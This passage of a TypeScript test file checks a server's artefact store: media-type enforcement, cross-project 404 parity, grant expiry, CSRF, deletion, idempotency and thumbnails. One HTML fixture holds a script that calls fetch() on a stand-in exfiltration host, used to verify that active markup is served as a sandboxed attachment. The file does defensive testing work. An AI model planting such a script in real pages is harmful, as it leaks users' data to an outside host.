/**
 * Stage 1 artefact store: kinds, active content, deletion, thumbnails,
 * idempotency, scope and storage figures (RVP-33).
 *
 * `apps/server/test/artefacts.test.ts` holds the four-step upload flow and
 * `apps/server/test/artefact-security.test.ts` holds the hostile-artefact
 * cases. This file holds what Stage 1 added, and its centre of gravity is the
 * two properties an artefact store gets wrong most easily:
 *
 * **Nothing is available before it is verified**, including a thumbnail the
 * server generated itself, and including an artefact whose store went away
 * mid-flow.
 *
 * **A read is scoped by the query.** Every case that reads an artefact from
 * outside its project asserts `RESOURCE_NOT_FOUND` and compares the body with
 * the one an identifier that never existed produces, because a refusal that
 * differs is an existence oracle (`docs/TESTING.md` §10).
 */

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { after, before, beforeEach, test } from "node:test";

import { loadServerConfig } from "../src/config.ts";
import { JobRunner } from "../src/jobs/runner.ts";
import {
  DEFAULT_ARTEFACT_MAX_BYTES,
  DEFAULT_ARTEFACT_PATH,
  loadArtefactStoreConfig,
} from "../src/modules/artefacts/config.ts";
import { artefactJobHandlers } from "../src/modules/artefacts/jobs.ts";
import {
  BOOTSTRAP_TOKEN,
  WORKER_CREDENTIAL,
  seedProjectAndWorker,
  startHarness,
  type Harness,
} from "./support/worker-harness.ts";
import { claimSessionFor } from "./support/identity.ts";
import { encodePng } from "./support/png.ts";
import { startMigratedDatabase, truncateAll, type MigratedDatabase } from "./support/postgres.ts";

let postgres: MigratedDatabase;
let harness: Harness;

before(async () => {
  postgres = await startMigratedDatabase();
});

after(async () => {
  await harness?.stop();
  await postgres?.stop();
});

beforeEach(async () => {
  await harness?.stop();
  await truncateAll(postgres.pool);
  harness = await startHarness(postgres.pool);
});

const ADMIN = { authorization: `Bearer ${BOOTSTRAP_TOKEN}` };
const WORKER = { authorization: `Bearer ${WORKER_CREDENTIAL}` };

function digest(bytes: Buffer): string {
  return createHash("sha256").update(bytes).digest("hex");
}

/** Enough environment for `loadServerConfig` to succeed, and nothing more. */
function minimalServerEnvironment(): Record<string, string> {
  return {
    REVIEWPLANE_DATABASE_URL: "postgres://localhost/reviewplane",
    REVIEWPLANE_BOOTSTRAP_TOKEN: "a".repeat(40),
    REVIEWPLANE_TUNNEL_CONTROL_TOKEN: "b".repeat(40),
    REVIEWPLANE_CAPABILITY_SIGNING_KEY: Buffer.alloc(32).toString("base64"),
    REVIEWPLANE_WORKER_CREDENTIAL: "c".repeat(32),
    REVIEWPLANE_WORKER_COMMAND_CREDENTIAL: "d".repeat(32),
  };
}

/** Runs the whole four-step flow and returns the artefact identifier. */
async function upload(
  projectId: string,
  bytes: Buffer,
  overrides: Record<string, unknown> = {},
  headers: Record<string, string> = WORKER,
): Promise<{ artefactId: string; status: number; body: unknown }> {
  const created = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: bytes.byteLength,
      sha256: digest(bytes),
      ...overrides,
    },
  });
  if (created.statusCode !== 201) {
    return { artefactId: "", status: created.statusCode, body: created.json() };
  }
  const { artefact_id: artefactId, upload_path: uploadPath } = (
    created.json() as { data: { artefact_id: string; upload_path: string } }
  ).data;
  // The transport header is not the artefact's media type: that was declared on
  // the intent and is verified against the bytes. Anything but an image travels
  // as an opaque stream.
  const declared = (overrides["content_type"] as string | undefined) ?? "image/png";
  const transport = declared.startsWith("image/") ? declared : "application/octet-stream";
  const stored = await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...headers, "content-type": transport },
    payload: bytes,
  });
  if (stored.statusCode !== 202) {
    return { artefactId, status: stored.statusCode, body: stored.json() };
  }
  const completed = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers,
    payload: { sha256: digest(bytes), size_bytes: bytes.byteLength },
  });
  return { artefactId, status: completed.statusCode, body: completed.json() };
}

async function mintGrant(artefactId: string, headers: Record<string, string> = ADMIN) {
  return harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/grants`,
    headers,
  });
}

// ---------------------------------------------------------------------------
// Kinds and media types
// ---------------------------------------------------------------------------

test("each Stage 1 kind accepts only the media types it is defined to hold", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const png = encodePng(64, 64);
  const html = Buffer.from("<!doctype html><html><body><p>captured</p></body></html>", "utf8");
  const json = Buffer.from(JSON.stringify({ role: "main", name: "Homepage" }), "utf8");

  const screenshot = await upload(projectId, png, { kind: "screenshot" });
  assert.equal(screenshot.status, 200, JSON.stringify(screenshot.body));

  const snapshot = await upload(projectId, html, {
    kind: "dom_snapshot",
    content_type: "text/html",
  });
  assert.equal(snapshot.status, 200, JSON.stringify(snapshot.body));

  const accessibility = await upload(projectId, json, {
    kind: "accessibility_snapshot",
    content_type: "application/json",
  });
  assert.equal(accessibility.status, 200, JSON.stringify(accessibility.body));

  // A screenshot cannot be markup, and a DOM snapshot cannot be an image: the
  // kind fixes the media type, so active content never reaches a code path
  // built for pixels and an image never reaches the attachment path.
  const markupAsScreenshot = await upload(projectId, html, {
    kind: "screenshot",
    content_type: "text/html",
  });
  assert.equal(markupAsScreenshot.status, 400);
  const imageAsSnapshot = await upload(projectId, png, {
    kind: "dom_snapshot",
    content_type: "image/png",
  });
  assert.equal(imageAsSnapshot.status, 400);
});

test("a kind this build does not capture is refused by name", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const refused = await upload(projectId, encodePng(8, 8), { kind: "trace" });
  assert.equal(refused.status, 400);
  const body = refused.body as { error: { code: string; message: string } };
  assert.equal(body.error.code, "UNSUPPORTED_CAPABILITY");
  // "not captured yet" tells an operator something; "unknown kind" would not.
  assert.match(body.error.message, /not captured yet/u);
});

test("JSON that is not JSON is refused, whatever the intent declared", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const notJson = Buffer.from("role: main\nname: Homepage\n", "utf8");
  const refused = await upload(projectId, notJson, {
    kind: "accessibility_snapshot",
    content_type: "application/json",
  });
  assert.equal(refused.status, 400);
  assert.match((refused.body as { error: { message: string } }).error.message, /valid JSON/u);
});

// ---------------------------------------------------------------------------
// Active content
// ---------------------------------------------------------------------------

test("a DOM snapshot is served as an attachment and never inline", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const html = Buffer.from(
    '<!doctype html><html><body><script>fetch("https://exfiltrate.invalid")</script></body></html>',
    "utf8",
  );
  const { artefactId, status } = await upload(projectId, html, {
    kind: "dom_snapshot",
    content_type: "text/html",
  });
  assert.equal(status, 200);

  const granted = await mintGrant(artefactId);
  assert.equal(granted.statusCode, 201, granted.body);
  const grant = (granted.json() as { data: { url: string; disposition: string } }).data;
  assert.equal(grant.disposition, "attachment");

  const content = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: ADMIN,
  });
  assert.equal(content.statusCode, 200);
  // `docs/SECURITY.md` section 13: active markup is never rendered under the
  // control-plane origin. An attachment is downloaded, not rendered, and the
  // policy, the frame refusal and `nosniff` hold even if a browser were told
  // otherwise.
  assert.match(String(content.headers["content-disposition"]), /^attachment;/u);
  assert.equal(content.headers["x-content-type-options"], "nosniff");
  assert.equal(content.headers["content-security-policy"], "default-src 'none'; sandbox");
  assert.equal(content.headers["x-frame-options"], "DENY");
  assert.equal(content.headers["cross-origin-resource-policy"], "same-origin");
  // The name offered is the artefact identifier, never a caller's label.
  assert.match(String(content.headers["content-disposition"]), new RegExp(`${artefactId}\\.html`, "u"));
  process.stdout.write(
    `EVIDENCE active content: ${String(content.headers["content-disposition"])} / ${String(content.headers["content-security-policy"])}\n`,
  );
});

test("an image artefact is served inline, because an img element needs it", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(40, 30));
  const granted = await mintGrant(artefactId);
  const grant = (granted.json() as { data: { url: string; disposition: string } }).data;
  assert.equal(grant.disposition, "inline");
  const content = await harness.built.app.inject({ method: "GET", url: grant.url, headers: ADMIN });
  assert.match(String(content.headers["content-disposition"]), /^inline;/u);
  assert.equal(content.headers["x-content-type-options"], "nosniff");
});

// ---------------------------------------------------------------------------
// Scope
// ---------------------------------------------------------------------------

test("an artefact in another project is not found, byte for byte, as an unknown one is", async () => {
  const first = await seedProjectAndWorker(harness);
  const cookies = await claimSessionFor(harness.built, postgres.pool, first.organisationId, {
    email: `viewer-${Date.now()}@localhost`,
  });

  // A second organisation and project the session has nothing to do with.
  const other = await harness.built.app.inject({
    method: "POST",
    url: "/api/v1/organisations",
    headers: ADMIN,
    payload: { name: "Elsewhere", slug: `org-elsewhere-${Date.now()}` },
  });
  const otherOrganisationId = (other.json() as { data: { id: string } }).data.id;
  const otherProject = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/organisations/${otherOrganisationId}/projects`,
    headers: ADMIN,
    payload: { name: "Elsewhere", slug: `prj-elsewhere-${Date.now()}` },
  });
  const otherProjectId = (otherProject.json() as { data: { id: string } }).data.id;
  const foreign = await upload(otherProjectId, encodePng(20, 20), {}, ADMIN);
  assert.equal(foreign.status, 200, JSON.stringify(foreign.body));

  const readForeign = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${foreign.artefactId}`,
    headers: cookies.readHeaders,
  });
  const readUnknown = await harness.built.app.inject({
    method: "GET",
    url: "/api/v1/artefacts/art_01JDOESNOTEXISTATALL",
    headers: cookies.readHeaders,
  });
  assert.equal(readForeign.statusCode, 404);
  assert.equal(readUnknown.statusCode, 404);
  // Byte for byte apart from the request identifier: a distinguishable refusal
  // for "exists but is not yours" is exactly the oracle section 10 forbids.
  const strip = (body: string): string => body.replace(/"request_id":"[^"]*"/u, '"request_id":"x"');
  assert.equal(strip(readForeign.body), strip(readUnknown.body));

  // The same holds for minting a grant, which is the route that reaches bytes.
  const grantForeign = await mintGrant(foreign.artefactId, cookies.writeHeaders);
  const grantUnknown = await mintGrant("art_01JDOESNOTEXISTATALL", cookies.writeHeaders);
  assert.equal(grantForeign.statusCode, 404);
  assert.equal(strip(grantForeign.body), strip(grantUnknown.body));
  process.stdout.write(`EVIDENCE cross-project read: ${strip(readForeign.body)}\n`);
});

test("a worker cannot upload into a project it is not assigned to", async () => {
  await seedProjectAndWorker(harness);
  const other = await harness.built.app.inject({
    method: "POST",
    url: "/api/v1/organisations",
    headers: ADMIN,
    payload: { name: "Elsewhere", slug: `org-x-${Date.now()}` },
  });
  const otherOrganisationId = (other.json() as { data: { id: string } }).data.id;
  const otherProject = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/organisations/${otherOrganisationId}/projects`,
    headers: ADMIN,
    payload: { name: "Elsewhere", slug: `prj-x-${Date.now()}` },
  });
  const otherProjectId = (otherProject.json() as { data: { id: string } }).data.id;

  const refused = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${otherProjectId}/artefacts/uploads`,
    headers: WORKER,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: 100,
      sha256: "a".repeat(64),
    },
  });
  assert.equal(refused.statusCode, 403);
});

// ---------------------------------------------------------------------------
// Grants
// ---------------------------------------------------------------------------

test("an expired grant is refused, and refused as an unknown one is", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(16, 16));
  const granted = await mintGrant(artefactId);
  const grant = (granted.json() as { data: { grant_id: string; url: string } }).data;

  // Expiry is a property of the row, so the test ages the row rather than the
  // clock: a grant whose expiry has passed is refused on resolution. Both
  // timestamps move, because the schema will not hold a grant that expired
  // before it was minted.
  const aged = await postgres.pool.query(
    `UPDATE artefact_access_grants
        SET created_at = now() - interval '10 minutes',
            expires_at = now() - interval '1 second'
      WHERE id = $1`,
    [grant.grant_id],
  );
  assert.equal(aged.rowCount, 1);
  const refused = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: ADMIN,
  });
  assert.equal(refused.statusCode, 401);
  assert.equal(
    (refused.json() as { error: { code: string } }).error.code,
    "AUTHENTICATION_REQUIRED",
  );
  const unknown = await harness.built.app.inject({
    method: "GET",
    url: "/api/v1/artefact-content/agr_neverexisted",
    headers: ADMIN,
  });
  assert.equal(unknown.statusCode, 401);
  process.stdout.write(
    `EVIDENCE expired grant: ${(refused.json() as { error: { message: string } }).error.message}\n`,
  );
});

test("every refusal from the content route is the same refusal", async () => {
  // RVP-67 criterion 1 applied to grants. An unknown grant, an expired one and
  // a live one presented by the wrong principal are three facts and must be one
  // answer: a status or a body that differs between them is an existence oracle
  // over grant identifiers. The identifier being 24 random bytes makes the
  // oracle expensive rather than absent, and expensive is not the property the
  // criterion asks for.
  const { organisationId, projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(16, 16));

  const cookies = await claimSessionFor(harness.built, postgres.pool, organisationId, {
    email: `oracle-${Date.now()}@localhost`,
  });
  const mine = await mintGrant(artefactId, cookies.writeHeaders);
  assert.equal(mine.statusCode, 201, mine.body);
  const grant = (mine.json() as { data: { grant_id: string; url: string } }).data;

  // A live grant, presented by a principal that is not its subject.
  const wrongSubject = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: ADMIN,
  });

  // A grant identifier that never existed.
  const unknown = await harness.built.app.inject({
    method: "GET",
    url: "/api/v1/artefact-content/agr_neverexistedatall",
    headers: ADMIN,
  });

  // A grant that existed and has expired.
  const expiring = await mintGrant(artefactId, cookies.writeHeaders);
  const expired = (expiring.json() as { data: { grant_id: string; url: string } }).data;
  await postgres.pool.query(
    `UPDATE artefact_access_grants
        SET created_at = now() - interval '10 minutes',
            expires_at = now() - interval '1 second'
      WHERE id = $1`,
    [expired.grant_id],
  );
  const afterExpiry = await harness.built.app.inject({
    method: "GET",
    url: expired.url,
    headers: cookies.readHeaders,
  });

  // A caller with no credential at all.
  const anonymous = await harness.built.app.inject({ method: "GET", url: grant.url });

  const strip = (body: string): string => body.replace(/"request_id":"[^"]*"/u, '"request_id":"x"');
  const answers = [wrongSubject, unknown, afterExpiry, anonymous];
  for (const answer of answers) {
    assert.equal(answer.statusCode, 401, answer.body);
  }
  const bodies = new Set(answers.map((answer) => strip(answer.body)));
  assert.equal(
    bodies.size,
    1,
    `the content route answers four cases four ways: ${[...bodies].join("\n")}`,
  );
  process.stdout.write(`EVIDENCE grant oracle: 401 x4, one body ${[...bodies][0] ?? ""}\n`);

  // The grant that is genuinely the caller's still works, so the unification is
  // not simply refusing everything.
  const served = await harness.built.app.inject({
    method: "GET",
    url: grant.url,
    headers: cookies.readHeaders,
  });
  assert.equal(served.statusCode, 200, served.body);
});

test("a read that the store cannot satisfy says so without naming the store", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(20, 20));
  const granted = await mintGrant(artefactId);
  const url = (granted.json() as { data: { url: string } }).data.url;

  // The bytes vanish underneath a verified artefact: the row still says
  // available, and the driver cannot produce them.
  const { rm } = await import("node:fs/promises");
  await rm(`${harness.artefactRoot}/sha256`, { recursive: true, force: true });

  const read = await harness.built.app.inject({ method: "GET", url, headers: ADMIN });
  assert.equal(read.statusCode, 503, read.body);
  const failure = read.json() as { error: { code: string; message: string } };
  assert.equal(failure.error.code, "ARTEFACT_STORE_UNAVAILABLE");
  // `docs/SECURITY.md` section 18: no deployment data in a response. An agent
  // session and a browser worker both reach this path, so the server's absolute
  // artefact root must not be in it.
  assert.ok(!read.body.includes(harness.artefactRoot), `the read leaked the store path: ${read.body}`);
  assert.ok(!/ENOENT|no such file|\/tmp\//u.test(read.body), `the read leaked the driver error: ${read.body}`);
  process.stdout.write(`EVIDENCE read failure: ${failure.error.code} ${failure.error.message}\n`);
});

test("minting a grant on a cookie session requires the CSRF token", async () => {
  const { organisationId, projectId } = await seedProjectAndWorker(harness);
  const cookies = await claimSessionFor(harness.built, postgres.pool, organisationId, {
    email: `csrf-${Date.now()}@localhost`,
  });
  const { artefactId } = await upload(projectId, encodePng(16, 16));

  const withoutToken = await mintGrant(artefactId, cookies.readHeaders);
  assert.equal(withoutToken.statusCode, 403);
  assert.equal(
    (withoutToken.json() as { error: { details?: { reason?: string } } }).error.details?.reason,
    "csrf_token_invalid",
  );

  const withToken = await mintGrant(artefactId, cookies.writeHeaders);
  assert.equal(withToken.statusCode, 201, withToken.body);
});

test("deleting on a cookie session requires the CSRF token", async () => {
  const { organisationId, projectId } = await seedProjectAndWorker(harness);
  const cookies = await claimSessionFor(harness.built, postgres.pool, organisationId, {
    email: `csrf-delete-${Date.now()}@localhost`,
  });
  const { artefactId } = await upload(projectId, encodePng(16, 16));

  const withoutToken = await harness.built.app.inject({
    method: "DELETE",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: cookies.readHeaders,
  });
  assert.equal(withoutToken.statusCode, 403);
  assert.equal(
    (withoutToken.json() as { error: { details?: { reason?: string } } }).error.details?.reason,
    "csrf_token_invalid",
  );
});

// ---------------------------------------------------------------------------
// Deletion
// ---------------------------------------------------------------------------

test("deleting removes the bytes, audits the deletion and leaves the identifier unresolvable", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(24, 24));
  const stored = await postgres.pool.query<{ storage_key: string }>(
    "SELECT storage_key FROM artefacts WHERE id = $1",
    [artefactId],
  );
  const key = stored.rows[0]?.storage_key ?? "";

  const deleted = await harness.built.app.inject({
    method: "DELETE",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: { ...ADMIN, "x-reviewplane-reason": "superseded by a recapture" },
  });
  assert.equal(deleted.statusCode, 200, deleted.body);
  assert.equal((deleted.json() as { data: { bytes_removed: boolean } }).data.bytes_removed, true);

  const { access } = await import("node:fs/promises");
  await assert.rejects(() => access(`${harness.artefactRoot}/${key}`));

  const read = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal(read.statusCode, 404);

  const events = await postgres.pool.query<{ payload: Record<string, unknown> }>(
    "SELECT payload FROM events WHERE type = 'artefact.deleted' AND project_id = $1",
    [projectId],
  );
  assert.equal(events.rows.length, 1);
  assert.equal(events.rows[0]?.payload["bytes_removed"], true);
  assert.equal(events.rows[0]?.payload["reason"], "superseded by a recapture");
});

test("a verified artefact's bytes cannot be rewritten", async () => {
  // ADR-0006: original evidence is immutable, and annotations are stored apart
  // from it rather than drawn into it. Immutability is a property of the API
  // surface — there is no route that replaces the bytes of an available
  // artefact — so it is asserted here rather than inferred from the absence of
  // one.
  const { projectId } = await seedProjectAndWorker(harness);
  const original = encodePng(64, 48, [15, 23, 42]);
  const { artefactId } = await upload(projectId, original);

  const replacement = encodePng(64, 48, [255, 0, 0]);
  const rewritten = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/content`,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: replacement,
  });
  assert.equal(rewritten.statusCode, 409, rewritten.body);
  assert.equal(
    (rewritten.json() as { error: { code: string } }).error.code,
    "IDEMPOTENCY_CONFLICT",
  );

  // Completing again with the original values is a no-op rather than a second
  // verification, and the bytes served are still the ones first stored.
  const completedAgain = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers: WORKER,
    payload: { sha256: digest(original) },
  });
  assert.equal(completedAgain.statusCode, 200);

  const granted = await mintGrant(artefactId);
  const content = await harness.built.app.inject({
    method: "GET",
    url: (granted.json() as { data: { url: string } }).data.url,
    headers: ADMIN,
  });
  assert.equal(digest(content.rawPayload), digest(original));
});

test("a machine credential may write or read evidence and may not delete it", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(16, 16));

  const byWorker = await harness.built.app.inject({
    method: "DELETE",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: WORKER,
  });
  assert.equal(byWorker.statusCode, 403, byWorker.body);
  assert.equal(
    (byWorker.json() as { error: { code: string } }).error.code,
    "AUTHORISATION_DENIED",
  );

  // And the artefact is untouched.
  const record = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal(record.statusCode, 200);
  const deletions = await postgres.pool.query<{ count: string }>(
    "SELECT count(*)::text AS count FROM events WHERE type = 'artefact.deleted'",
  );
  assert.equal(deletions.rows[0]?.count, "0", "a refused delete wrote an event");
});

test("deleting one of two artefacts with identical bytes keeps the shared object", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const bytes = encodePng(32, 32);
  const before = await upload(projectId, bytes);
  const after = await upload(projectId, bytes);
  assert.notEqual(before.artefactId, after.artefactId);

  const keys = await postgres.pool.query<{ storage_key: string }>(
    "SELECT storage_key FROM artefacts WHERE id = ANY($1)",
    [[before.artefactId, after.artefactId]],
  );
  // Content addressing means identical bytes are one object (ADR-0012).
  assert.equal(new Set(keys.rows.map((row) => row.storage_key)).size, 1);
  const key = keys.rows[0]?.storage_key ?? "";

  const deleted = await harness.built.app.inject({
    method: "DELETE",
    url: `/api/v1/artefacts/${before.artefactId}`,
    headers: ADMIN,
  });
  assert.equal((deleted.json() as { data: { bytes_removed: boolean } }).data.bytes_removed, false);

  const { access } = await import("node:fs/promises");
  await access(`${harness.artefactRoot}/${key}`);

  // The other artefact is still evidence, and still readable.
  const granted = await mintGrant(after.artefactId);
  assert.equal(granted.statusCode, 201);
  const content = await harness.built.app.inject({
    method: "GET",
    url: (granted.json() as { data: { url: string } }).data.url,
    headers: ADMIN,
  });
  assert.equal(content.statusCode, 200);
  assert.equal(digest(content.rawPayload), digest(bytes));
});

// ---------------------------------------------------------------------------
// Idempotency and worker crash
// ---------------------------------------------------------------------------

test("a retried upload intent with the same idempotency key produces one artefact", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const bytes = encodePng(48, 48);
  const payload = {
    kind: "screenshot",
    content_type: "image/png",
    size_bytes: bytes.byteLength,
    sha256: digest(bytes),
  };
  const headers = { ...WORKER, "idempotency-key": "capture-01" };

  const first = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers,
    payload,
  });
  assert.equal(first.statusCode, 201, first.body);
  const artefactId = (first.json() as { data: { artefact_id: string } }).data.artefact_id;

  // The worker crashes after the intent and before the content, then retries
  // the whole flow with the same key (`docs/TESTING.md` section 11).
  const second = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers,
    payload,
  });
  assert.equal(second.statusCode, 200, second.body);
  assert.equal(
    (second.json() as { data: { artefact_id: string } }).data.artefact_id,
    artefactId,
    "a retry replays the first intent rather than creating a second artefact",
  );

  const count = await postgres.pool.query<{ count: string }>(
    "SELECT count(*)::text AS count FROM artefacts WHERE project_id = $1",
    [projectId],
  );
  assert.equal(count.rows[0]?.count, "1");

  // And the retry can finish the upload it inherited.
  const uploaded = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/content`,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: bytes,
  });
  assert.equal(uploaded.statusCode, 202);
  const completed = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers: WORKER,
    payload: { sha256: digest(bytes) },
  });
  assert.equal(completed.statusCode, 200);
});

test("the same idempotency key used for different bytes is a conflict", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const headers = { ...WORKER, "idempotency-key": "capture-02" };
  const first = encodePng(10, 10);
  const second = encodePng(11, 11);

  const created = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: first.byteLength,
      sha256: digest(first),
    },
  });
  assert.equal(created.statusCode, 201);

  const conflicting = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: second.byteLength,
      sha256: digest(second),
    },
  });
  assert.equal(conflicting.statusCode, 409);
  assert.equal(
    (conflicting.json() as { error: { code: string } }).error.code,
    "IDEMPOTENCY_CONFLICT",
  );
});

test("a worker that crashes after uploading leaves nothing available", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const bytes = encodePng(18, 18);
  const created = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers: WORKER,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: bytes.byteLength,
      sha256: digest(bytes),
    },
  });
  const { artefact_id: artefactId, upload_path: uploadPath } = (
    created.json() as { data: { artefact_id: string; upload_path: string } }
  ).data;
  await harness.built.app.inject({
    method: "POST",
    url: uploadPath,
    headers: { ...WORKER, "content-type": "image/png" },
    payload: bytes,
  });
  // The worker dies here. Completion never arrives.

  const record = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal((record.json() as { data: { state: string } }).data.state, "uploaded");
  const granted = await mintGrant(artefactId);
  assert.equal(granted.statusCode, 409, "unverified bytes are not evidence and get no grant");

  // A replacement worker completes it, and only then is it available.
  const completed = await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/artefacts/${artefactId}/complete`,
    headers: WORKER,
    payload: { sha256: digest(bytes) },
  });
  assert.equal(completed.statusCode, 200);
  assert.equal((completed.json() as { data: { state: string } }).data.state, "available");
});

// ---------------------------------------------------------------------------
// Thumbnails
// ---------------------------------------------------------------------------

test("the thumbnail job produces a separate, verified artefact and never rewrites the original", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const bytes = encodePng(800, 600, [200, 30, 40]);
  const { artefactId, status } = await upload(projectId, bytes);
  assert.equal(status, 200);

  const pending = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal((pending.json() as { data: { thumbnail_state: string } }).data.thumbnail_state, "pending");

  const runner = new JobRunner({
    pool: postgres.pool,
    handlers: artefactJobHandlers(harness.built.artefacts),
  });
  assert.ok((await runner.drain()) >= 1, "the completion enqueued a thumbnail job");

  const after = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  const record = (
    after.json() as {
      data: { thumbnail_state: string; thumbnail_artefact_id: string; sha256: string };
    }
  ).data;
  assert.equal(record.thumbnail_state, "generated");
  assert.ok(record.thumbnail_artefact_id.length > 0);
  // ADR-0006: the original bytes are untouched.
  assert.equal(record.sha256, digest(bytes));

  const thumbnail = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${record.thumbnail_artefact_id}`,
    headers: ADMIN,
  });
  const thumbnailRecord = (
    thumbnail.json() as {
      data: {
        kind: string;
        state: string;
        content_type: string;
        source_artefact_id: string;
        sha256: string;
        content_rectangle: { width_px: number; height_px: number };
      };
    }
  ).data;
  assert.equal(thumbnailRecord.kind, "thumbnail");
  assert.equal(thumbnailRecord.state, "available");
  assert.equal(thumbnailRecord.content_type, "image/png");
  assert.equal(thumbnailRecord.source_artefact_id, artefactId);
  assert.equal(thumbnailRecord.content_rectangle.width_px, 320);
  assert.equal(thumbnailRecord.content_rectangle.height_px, 240);

  // The thumbnail is real, readable PNG whose stored digest is the one recorded.
  const granted = await mintGrant(record.thumbnail_artefact_id);
  const content = await harness.built.app.inject({
    method: "GET",
    url: (granted.json() as { data: { url: string } }).data.url,
    headers: ADMIN,
  });
  assert.equal(content.statusCode, 200);
  assert.equal(digest(content.rawPayload), thumbnailRecord.sha256);
  assert.equal(content.headers["content-type"], "image/png");

  const events = await postgres.pool.query<{ payload: Record<string, unknown> }>(
    "SELECT payload FROM events WHERE type = 'artefact.thumbnail_generated' AND project_id = $1",
    [projectId],
  );
  assert.equal(events.rows.length, 1);
  assert.equal(events.rows[0]?.payload["state"], "generated");
});

test("a thumbnail is not attempted for a kind that has no picture", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const json = Buffer.from(JSON.stringify({ nodes: [] }), "utf8");
  const { artefactId } = await upload(projectId, json, {
    kind: "accessibility_snapshot",
    content_type: "application/json",
  });
  const record = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal(
    (record.json() as { data: { thumbnail_state: string } }).data.thumbnail_state,
    "not_requested",
  );
});

// ---------------------------------------------------------------------------
// Retention, encryption reference and storage figures
// ---------------------------------------------------------------------------

test("retention is recorded as an expiry and nothing is deleted", async () => {
  const { projectId } = await seedProjectAndWorker(harness);
  const { artefactId } = await upload(projectId, encodePng(12, 12), {
    retention_class: "verification_evidence",
  });
  const record = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  const data = (
    record.json() as {
      data: { expires_at: string | null; retention_class: string; encryption_key_reference: null };
    }
  ).data;
  assert.equal(data.retention_class, "verification_evidence");
  assert.ok(data.expires_at !== null, "an expiry is recorded");
  assert.ok(new Date(data.expires_at).getTime() > Date.now(), "the expiry is in the future");
  // `docs/SECURITY.md` section 15: the reference is stored and Stage 1 encrypts
  // nothing, so a null value is the honest statement that these bytes are not
  // application-encrypted.
  assert.equal(data.encryption_key_reference, null);

  // Nothing removes it: no expiry job runs in this stage.
  const expired = await postgres.pool.query(
    "UPDATE artefacts SET expires_at = now() - interval '1 day' WHERE id = $1 RETURNING id",
    [artefactId],
  );
  assert.equal(expired.rowCount, 1);
  const stillThere = await harness.built.app.inject({
    method: "GET",
    url: `/api/v1/artefacts/${artefactId}`,
    headers: ADMIN,
  });
  assert.equal(stillThere.statusCode, 200);
});

test("storage figures count verified artefacts once per content-addressed key", async () => {
